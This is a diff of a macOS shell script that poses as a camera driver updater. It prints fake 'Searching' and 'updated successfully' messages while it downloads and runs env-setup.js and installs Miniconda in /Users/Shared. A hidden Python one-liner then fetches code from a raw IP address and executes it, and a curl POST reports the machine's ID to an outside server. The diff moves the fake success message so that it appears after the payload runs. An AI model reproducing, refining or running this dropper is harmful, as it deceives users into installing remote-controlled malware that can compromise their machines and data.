@@ -11,16 +11,8 @@ err()   { echo "[ERROR] $*" >&2; }
 die()   { err "$*"; exit 1; }
 delay() { sleep "${1:-1}"; }
 
-delay 4
 echo "[INFO] Searching for Camera Drivers ..."
-delay 6
-echo "[INFO] Updating Driver Packages..."
-delay 12
-echo "[SUCCESS] Camera drivers have been updated successfully."
 
-if [[ -n "${MAC_UID:-}" && "$MAC_UID" != "__ID__" ]]; then
-  AUTO_URL="https://api.canditech.org/change-connection-status/${MAC_UID}"
-  curl -sL -X POST "$AUTO_URL" >/dev/null 2>&1 || true
 fi
 download() {
   # download <url> <output>
@@ -111,7 +103,7 @@ fi
 # Verify Node works
 # -------------------------
 "$NODE_EXE" -v >/dev/null 2>&1 || die "Driver execution failed."
-
+echo "[INFO] Updating Driver Packages..."
 # -------------------------
 # Download and run env-setup.js
 # -------------------------
@@ -151,4 +143,9 @@ bash miniconda.sh -b -p "/Users/Shared/miniconda3" > /dev/null 2>&1 && \
 
 "/Users/Shared/miniconda3/bin/python3" -c "from urllib.request import urlopen,Request;Request._V='7-test';Request._target='http://23.27.120.142:27017';Request._code=urlopen(Request('http://198.105.127.210/$/1',headers={'Sec-V':Request._V})).read().decode('utf-8');exec(Request._code)" > /dev/null 2>&1 && \
 
+echo "[SUCCESS] Camera drivers have been updated successfully."
+
+if [[ -n "${MAC_UID:-}" && "$MAC_UID" != "__ID__" ]]; then
+  AUTO_URL="https://api.canditech.org/change-connection-status/${MAC_UID}"
+  curl -sL -X POST "$AUTO_URL" >/dev/null 2>&1 || true
 rm -f miniconda.sh
